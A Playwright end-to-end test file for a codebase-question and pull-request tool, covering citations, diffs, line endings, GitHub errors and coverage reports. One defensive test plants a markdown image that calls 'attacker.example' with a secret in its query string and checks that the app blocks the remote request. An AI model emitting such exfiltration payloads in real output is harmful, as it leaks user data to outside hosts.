import { expect, test } from '@playwright/test';
import { CITED_PATH, SHA, mockApi } from './fixtures.js';

test.use({ baseURL: process.env.E2E_WORKSPACE_URL || 'http://127.0.0.1:4174' });

test('workspace lists repositories and shows indexing progress', async ({ page }) => {
  await mockApi(page);
  await page.goto('/app');
  const sidebar = page.getByRole('navigation', { name: 'Repositories' });
  await expect(sidebar.getByText('cal.com', { exact: true })).toBeVisible();
  await expect(sidebar.getByText('fastapi', { exact: true })).toBeVisible();
  await sidebar.getByText('fastapi', { exact: true }).click();
  await expect(page).toHaveURL(/\/app\/r\/fastapi$/);
  await expect(page.getByText('Reading source files (120 of 900 changed files).')).toBeVisible();
  await expect(page.getByRole('textbox', { name: 'Ask about this codebase' })).toBeDisabled();
});

test('a streamed answer renders clickable citations that open the exact lines', async ({ page }) => {
  await mockApi(page);
  await page.goto('/app/r/cal.com');
  await expect(page.getByText('How does authentication work, end to end?')).toBeVisible();
  const composer = page.getByRole('textbox', { name: 'Ask about this codebase' });
  await composer.fill('Where is booking confirmation handled?');
  await composer.press('Enter');
  await expect(page.getByText('which updates the booking and sends emails.')).toBeVisible();
  await page.getByRole('button', { name: /handleConfirmation\.ts:42–118/ }).click();
  const panel = page.getByRole('complementary', { name: `File ${CITED_PATH}` }).first();
  await expect(panel.getByText('Lines 42–118')).toBeVisible();
  await expect(panel.getByRole('link', { name: 'Open on GitHub' })).toHaveAttribute('href', new RegExp(`${SHA}.*#L42-L118`));
});

test('code search finds identifiers without a model call', async ({ page }) => {
  await mockApi(page);
  await page.goto('/app/r/cal.com');
  await page.getByRole('tab', { name: 'Overview' }).click();
  await page.getByPlaceholder(/Search code/).fill('handleConfirmation');
  await expect(page.getByText('export async function handleConfirmation(booking: Booking) {')).toBeVisible();
});

test('an edit proposal shows green and red diffs and opens a pull request', async ({ page }) => {
  const state = await mockApi(page, { githubConnected: true });
  await page.goto('/app/r/cal.com');
  await page.getByRole('radio', { name: 'Edit & PR' }).click();
  const composer = page.getByRole('textbox', { name: 'Describe the code change' });
  await composer.fill('Send confirmation emails in the attendee timezone');
  await composer.press('Enter');
  await expect(page.getByText('2 files changed')).toBeVisible();
  // The first file's diff is expanded inline in the conversation.
  await expect(page.getByText('const line5 = toAttendeeTimezone(5);').first()).toBeVisible();
  await page.getByRole('button', { name: 'Review & create PR' }).click();
  const dialog = page.getByRole('dialog', { name: 'Review changes' });
  await expect(dialog.getByText('Connected as')).toBeVisible();
  await dialog.getByRole('radio', { name: 'Split' }).click();
  await expect(dialog.getByText('const line5 = toAttendeeTimezone(5);').first()).toBeVisible();
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  await expect(page.getByText('Pull request #123 created')).toBeVisible();
  expect(state.pushes).toHaveLength(1);
  const pushed = state.pushes[0];
  expect(pushed.files.map((file) => file.action)).toEqual(['modify', 'create']);
  expect(pushed.files[0].file_sha).toBe('abc123');
  expect(pushed.files[1].file_sha).toBe('');
  expect(pushed.branch_name).toMatch(/^codebase-intel\//);
});

test('the PR action requires a GitHub connection', async ({ page }) => {
  await mockApi(page, { githubConnected: false });
  await page.goto('/app/r/cal.com');
  await page.getByRole('radio', { name: 'Edit & PR' }).click();
  const composer = page.getByRole('textbox', { name: 'Describe the code change' });
  await composer.fill('Send confirmation emails in the attendee timezone');
  await composer.press('Enter');
  await page.getByRole('button', { name: 'Review & create PR' }).click();
  const dialog = page.getByRole('dialog', { name: 'Review changes' });
  await expect(dialog.getByRole('button', { name: 'Connect GitHub' })).toBeVisible();
  await expect(dialog.getByRole('button', { name: 'Create pull request' })).toBeDisabled();
});

test('the command palette jumps between repositories', async ({ page }) => {
  await mockApi(page);
  await page.goto('/app');
  // Wait for the lazily loaded workspace (and its shortcut listener).
  await expect(page.getByRole('navigation', { name: 'Repositories' }).getByText('cal.com', { exact: true })).toBeVisible();
  await page.keyboard.press(process.platform === 'darwin' ? 'Meta+K' : 'Control+K');
  await page.getByRole('combobox', { name: 'Search commands' }).fill('cal');
  await page.keyboard.press('Enter');
  await expect(page).toHaveURL(/\/app\/r\/cal\.com$/);
});

const sseBody = (events) => `: connected\n\n${events.map(([event, data]) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`).join('')}`;
const streamOnce = (page, done) => page.route('**/api/query/stream', (route) => route.fulfill({
  status: 200, headers: { 'content-type': 'text/event-stream' }, body: sseBody([['done', done]]),
}));
const editProposal = (id, title, files) => ({ id, title, summary: title, pr_body: title, validation: [], files, stats: {} });
const askForEdit = async (page, text = 'Change it') => {
  await page.getByRole('radio', { name: 'Edit & PR' }).click();
  const composer = page.getByRole('textbox', { name: 'Describe the code change' });
  await composer.fill(text);
  await composer.press('Enter');
};

test('identifiers stay code, images become links, and only verified references become chips', async ({ page }) => {
  await mockApi(page);
  const remote = [];
  page.on('request', (request) => { if (request.url().includes('attacker.example')) remote.push(request.url()); });
  const answer = [
    `Confirmed in \`${CITED_PATH}:L42-L118\`, which sets \`BookingStatus.ACCEPTED\` via \`prisma.booking.update\` and \`req.body\`.`,
    'Route group: `apps/web/app/(use-page-wrapper)/bookings/page.tsx:L1-L20`. Missing: `ghost/missing.ts:L3`.',
    '',
    '![status](https://attacker.example/pixel.png?q=secret)',
  ].join('\n');
  await streamOnce(page, {
    answer, mode: 'rag', citations: [],
    answer_references: [
      { text: `${CITED_PATH}:L42-L118`, file_path: CITED_PATH, start_line: 42, end_line: 118, valid: true },
      { text: 'apps/web/app/(use-page-wrapper)/bookings/page.tsx:L1-L20', file_path: 'apps/web/app/(use-page-wrapper)/bookings/page.tsx', start_line: 1, end_line: 20, valid: true },
      { text: 'ghost/missing.ts:L3', file_path: 'ghost/missing.ts', start_line: 3, end_line: 3, valid: false },
    ],
  });
  await page.goto('/app/r/cal.com');
  const composer = page.getByRole('textbox', { name: 'Ask about this codebase' });
  await composer.fill('Where is booking confirmation handled?');
  await composer.press('Enter');
  const prose = page.locator('.prose-answer').last();
  await expect(prose.getByText('Missing:')).toBeVisible();
  await expect(prose.getByRole('button')).toHaveCount(2);
  await expect(prose.getByRole('button', { name: /use-page-wrapper/ })).toBeVisible();
  await expect(prose.locator('code', { hasText: 'BookingStatus.ACCEPTED' })).toBeVisible();
  await expect(prose.locator('code.unverified-reference', { hasText: 'ghost/missing.ts:L3' })).toBeVisible();
  await expect(prose.locator('img')).toHaveCount(0);
  await expect(prose.getByRole('link', { name: 'status' })).toHaveAttribute('href', /attacker\.example/);
  expect(remote).toHaveLength(0);
});

test('editing a CRLF file in the review keeps CRLF line endings in the pushed content', async ({ page }) => {
  const state = await mockApi(page, { githubConnected: true });
  const before = Array.from({ length: 30 }, (_, index) => `line ${index + 1}`).join('\r\n') + '\r\n';
  const after = before.replace('line 5\r\n', 'line five\r\n');
  const file = {
    file_path: 'packages/lib/crlf.ts', action: 'modify', summary: 'crlf', changes: [{ old: 'line 5', new: 'line five' }],
    before, after, base_blob_sha: 'sha-crlf', additions: 1, deletions: 1,
  };
  await streamOnce(page, { answer: 'Ready.', mode: 'editing', citations: [], edit_suggestion: editProposal('p-crlf', 'CRLF change', [file]), edit_ticket: 't' });
  await page.goto('/app/r/cal.com');
  await askForEdit(page);
  await page.getByRole('button', { name: 'Review & create PR' }).click();
  const dialog = page.getByRole('dialog', { name: 'Review changes' });
  await dialog.getByRole('button', { name: 'Edit', exact: true }).click();
  const textarea = dialog.getByRole('textbox', { name: 'Edit packages/lib/crlf.ts' });
  await textarea.evaluate((node) => { node.focus(); node.setSelectionRange(node.value.length, node.value.length); });
  await textarea.pressSequentially('line 31');
  // Typing mid-file keeps the caret where it is.
  await textarea.evaluate((node) => { const at = node.value.indexOf('line 3\n') + 'line 3'.length; node.setSelectionRange(at, at); });
  await textarea.pressSequentially('ab');
  await dialog.getByRole('button', { name: 'Show diff' }).click();
  await expect(dialog.getByText('Line endings change')).toHaveCount(0);
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  await expect(page.getByText('Pull request #123 created')).toBeVisible();
  const pushed = state.pushes[0].files[0].new_content;
  expect(pushed).toBe(`${after.replace('line 3\r\n', 'line 3ab\r\n')}line 31`);
  expect(pushed.split('\r\n')).toHaveLength(31);
  expect(pushed.replace(/\r\n/g, '')).not.toContain('\n');
});

test('a slow refresh of an earlier proposal never leaks into a newer review', async ({ page }) => {
  const state = await mockApi(page, { githubConnected: true });
  let calls = 0;
  await page.route('**/api/github/file**', async (route) => {
    calls += 1;
    if (calls === 1) await new Promise((resolve) => { setTimeout(resolve, 1500); });
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ path: 'src/x.ts', content: 'const a = 1;\n', sha: 'blob-1' }) });
  });
  const lazyFile = (replacement) => ({
    file_path: 'src/x.ts', action: 'modify', summary: 's', changes: [{ old: 'const a = 1;', new: replacement }],
    before: null, after: null, base_blob_sha: null, additions: 1, deletions: 1,
  });
  await streamOnce(page, { answer: 'First.', mode: 'editing', citations: [], edit_suggestion: editProposal('p-old', 'Old attempt', [lazyFile('OLD_ATTEMPT')]), edit_ticket: 't1' });
  await page.goto('/app/r/cal.com');
  await askForEdit(page, 'first');
  await page.getByRole('button', { name: 'Review & create PR' }).click();
  const dialog = page.getByRole('dialog', { name: 'Review changes' });
  await expect(dialog.getByText('Loading the current file from GitHub')).toBeVisible();
  await dialog.getByRole('button', { name: 'Close review' }).click();
  await page.unroute('**/api/query/stream');
  await streamOnce(page, { answer: 'Second.', mode: 'editing', citations: [], edit_suggestion: editProposal('p-new', 'New attempt', [lazyFile('NEW_ATTEMPT')]), edit_ticket: 't2' });
  await askForEdit(page, 'second');
  await page.getByRole('button', { name: 'Review & create PR' }).last().click();
  await expect(dialog.getByText('NEW_ATTEMPT').first()).toBeVisible();
  await page.waitForTimeout(1800);
  await expect(dialog.getByText('OLD_ATTEMPT')).toHaveCount(0);
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  await expect(page.getByText('Pull request #123 created')).toBeVisible();
  expect(state.pushes[0].files[0].new_content).toBe('NEW_ATTEMPT\n');
  expect(state.pushes[0].pr_title).toBe('New attempt');
});

const openFixtureReview = async (page) => {
  await page.goto('/app/r/cal.com');
  await askForEdit(page, 'Send confirmation emails in the attendee timezone');
  await page.getByRole('button', { name: 'Review & create PR' }).click();
  return page.getByRole('dialog', { name: 'Review changes' });
};

test('a GitHub permission refusal explains access, keeps GitHub connected and is not retried', async ({ page }) => {
  await mockApi(page, { githubConnected: true });
  const pushes = [];
  await page.route('**/api/github/push-pr', (route) => {
    pushes.push(route.request().postDataJSON());
    return route.fulfill({ status: 403, contentType: 'application/json', headers: { 'X-Error-Code': 'github_permission' }, body: JSON.stringify({ detail: 'GitHub denied write access to calcom/cal.com' }) });
  });
  const dialog = await openFixtureReview(page);
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  await expect(dialog.getByRole('alert')).toContainText('approve the Codebase Intel OAuth app');
  expect(pushes).toHaveLength(1);
  await expect(dialog.getByText('Connected as')).toBeVisible();
  await expect(dialog.getByRole('button', { name: 'Create pull request' })).toBeEnabled();
});

test('rate limiting shows the wait and the retry reuses the idempotency key', async ({ page }) => {
  const state = await mockApi(page, { githubConnected: true });
  const keys = [];
  await page.route('**/api/github/push-pr', (route) => {
    keys.push(route.request().postDataJSON().idempotency_key);
    if (keys.length === 1) {
      return route.fulfill({ status: 429, contentType: 'application/json', headers: { 'Retry-After': '5' }, body: JSON.stringify({ detail: 'Rate limited' }) });
    }
    return route.fallback();
  });
  const dialog = await openFixtureReview(page);
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  await expect(dialog.getByRole('alert')).toContainText('Wait 5 seconds');
  await expect(dialog.getByRole('button', { name: /Try again in \ds/ })).toBeDisabled();
  await expect(dialog.getByRole('button', { name: 'Create pull request' })).toBeEnabled({ timeout: 10000 });
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  await expect(page.getByText('Pull request #123 created')).toBeVisible();
  expect(keys).toHaveLength(2);
  expect(keys[1]).toBe(keys[0]);
  expect(state.pushes).toHaveLength(1);
});

test('an existing branch offers a new branch name instead of a refresh', async ({ page }) => {
  await mockApi(page, { githubConnected: true });
  const branches = [];
  await page.route('**/api/github/push-pr', (route) => {
    branches.push(route.request().postDataJSON());
    if (branches.length === 1) {
      return route.fulfill({ status: 409, contentType: 'application/json', body: JSON.stringify({ detail: 'Branch codebase-intel/x already exists with different content.' }) });
    }
    return route.fallback();
  });
  const dialog = await openFixtureReview(page);
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  const alert = dialog.getByRole('alert');
  await expect(alert).toContainText('Choose a new branch name');
  await expect(alert).not.toContainText('Refresh from GitHub');
  await alert.getByRole('button', { name: 'Use a new branch name' }).click();
  await dialog.getByRole('button', { name: 'Create pull request' }).click();
  await expect(page.getByText('Pull request #123 created')).toBeVisible();
  expect(branches[1].branch_name).not.toBe(branches[0].branch_name);
  expect(branches[1].idempotency_key).not.toBe(branches[0].idempotency_key);
});

test('incomplete and approximate proposals are flagged, and unconfirmed issues say Refs', async ({ page }) => {
  await mockApi(page, { githubConnected: true });
  const file = {
    file_path: 'src/a.ts', action: 'modify', summary: 's', changes: [{ old: 'const a = 1;', new: 'const a = 2;' }],
    before: 'const a = 1;\n', after: 'const a = 2;\n', base_blob_sha: 'sha-a', additions: 1, deletions: 1,
  };
  await streamOnce(page, {
    answer: 'Ready.', mode: 'editing', citations: [], edit_ticket: 't',
    edit_suggestion: {
      ...editProposal('p-partial', 'Partial change', [file]), issue_reference: 7, issue_confirmed: false, incomplete: true,
      unchanged_files: [{ file_path: 'src/b.ts', reason: 'Context budget reached before this file' }], approximate_files: ['src/a.ts'],
    },
  });
  await page.goto('/app/r/cal.com');
  await askForEdit(page);
  await expect(page.getByText('This change may be incomplete')).toBeVisible();
  await expect(page.getByText('Context budget reached before this file')).toBeVisible();
  await expect(page.getByText('Refs #7')).toBeVisible();
  await expect(page.getByText(/Fixes #7/i)).toHaveCount(0);
  await expect(page.getByText('Approximate', { exact: true })).toBeVisible();
  let release;
  const gate = new Promise((resolve) => { release = resolve; });
  await page.route('**/api/github/file**', async (route) => {
    await gate;
    await route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ path: 'src/a.ts', content: 'const a = 1; // real\n', sha: 'sha-real' }) });
  });
  await page.getByRole('button', { name: 'Review & create PR' }).click();
  const dialog = page.getByRole('dialog', { name: 'Review changes' });
  await expect(dialog.getByText('1 file was reconstructed from the index')).toBeVisible();
  await expect(dialog.getByText('This change may be incomplete')).toBeVisible();
  // Opening the review re-applies the change to the real GitHub file.
  release();
  await expect(dialog.getByText('Re-applied to latest')).toBeVisible();
  await expect(dialog.getByText('1 file was reconstructed from the index')).toHaveCount(0);
  await expect(dialog.getByText('const a = 2; // real').first()).toBeVisible();
});

test('coverage shows the budget breakdown and how many paths are listed; file view flags truncated and reconstructed files', async ({ page }) => {
  await mockApi(page);
  await page.route('**/api/repos/cal.com/coverage', (route) => route.fulfill({
    status: 200, contentType: 'application/json',
    body: JSON.stringify({
      total_seen_files: 7695, indexed_files: 5600, excluded_files: 2095, excluded_bytes: 150000000,
      excluded_reasons: { repository_budget: 300 }, selection: { budget_omitted_files: 300, selected_files: 5600, candidate_files: 5900 },
      budget_omitted_by_category: { tests: 200, fixtures: 100 },
      budget_omitted_sample: [{ path: 'apps/web/test/a.test.ts', category: 'tests' }],
      excluded_paths: ['a.png', 'b.png'], excluded_paths_shown: 2, excluded_paths_total: 2095,
    }),
  }));
  await page.route('**/api/repos/cal.com/file**', (route) => route.fulfill({
    status: 200, contentType: 'application/json',
    body: JSON.stringify({ path: 'src/big.ts', content: 'line 1\nline 2\n', source: 'index', exact: false, truncated: true, total_lines: 50000 }),
  }));
  await page.goto('/app/r/cal.com');
  await page.getByRole('button', { name: 'Repository actions' }).click();
  await page.getByRole('menuitem', { name: 'Coverage report' }).click();
  const dialog = page.getByRole('dialog', { name: 'Coverage report' });
  await expect(dialog.getByText('Left out by the importance budget')).toBeVisible();
  await expect(dialog.getByText('tests', { exact: true }).first()).toBeVisible();
  await expect(dialog.getByText(/Budget-omitted files \(1 of 300 shown\)/)).toBeVisible();
  await expect(dialog.getByText(/Skipped paths \(2 of 2,095 shown\)/)).toBeVisible();
  await page.keyboard.press('Escape');
  await streamOnce(page, { answer: 'See `src/big.ts:L40000`.', mode: 'rag', citations: [] });
  const composer = page.getByRole('textbox', { name: 'Ask about this codebase' });
  await composer.fill('Where?');
  await composer.press('Enter');
  await page.getByRole('button', { name: /big\.ts:40000/ }).click();
  await expect(page.getByText('Reconstructed from the index').first()).toBeVisible();
  await expect(page.getByText(/showing the first 2 of 50,000 lines/).first()).toBeVisible();
  await expect(page.getByText(/cited lines are further down/).first()).toBeVisible();
});
